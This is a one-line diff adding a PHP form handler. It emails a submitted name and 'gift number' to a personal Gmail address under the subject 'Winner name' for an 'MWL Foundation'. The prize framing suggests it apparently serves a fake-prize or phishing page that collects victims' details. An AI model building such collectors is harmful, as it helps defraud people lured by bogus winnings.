@@ -1,0 +1,1 @@
+<?php $recepient="octaw13@gmail.com";$siteName="MWL Foundation";$name=trim($_POST["name"]);$number=trim($_POST["number"]);$message="Name: $name \nGift number: $number";$pagetitle="Winner name \"$siteName\"";mail($recepient,$pagetitle,$message,"Content-type: text/plain; charset=\"utf-8\"\n From: $recepient"); ?>
